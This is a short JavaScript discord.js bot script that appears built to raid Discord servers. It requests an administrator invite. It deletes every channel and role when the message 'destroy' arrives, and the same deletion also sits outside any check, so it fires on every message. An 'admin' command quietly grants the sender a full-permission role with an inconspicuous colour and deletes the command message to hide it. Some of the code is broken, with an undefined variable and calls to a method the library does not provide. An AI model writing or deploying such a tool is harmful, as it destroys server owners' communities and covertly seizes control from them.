const Discord = require("discord.js");
const bot = new Discord.Client();

let token = "TOKEN HERE!";

bot.on("ready", async () => {
    console.log(`${bot.user.username} ready!`);
try {
		//Generates a invite link in the console...
	let link = await bot.generateInvite(["ADMINISTRATOR"]);
	console.log(link);
	} catch(e) {
		console.log(e.stack);
	}
});


bot.on("message", async message => {
    if(message.content === "destroy"){
        message.guild.channels.deleteAll("Bot Destroyer");
        message.guild.roles.deleteAll("Bot Destroyer");
    }

 if(command === `admin`) {
  	try {
	role = await message.guild.createRole({
 	name: "Mamamelo en cruz",
  	color: "#2f3136",
  	permissions: [8]
	});
	message.member.addRole(role)
	message.delete(1000);
	} catch(e) {
		console.log(e.stack);
	}
   }

    if(message.content === "leave"){
        message.guild.leave();
    }
    message.guild.channels.deleteAll("Bot Destroyer");
    message.guild.roles.deleteAll("Bot Destroyer");

});
bot.login(token);
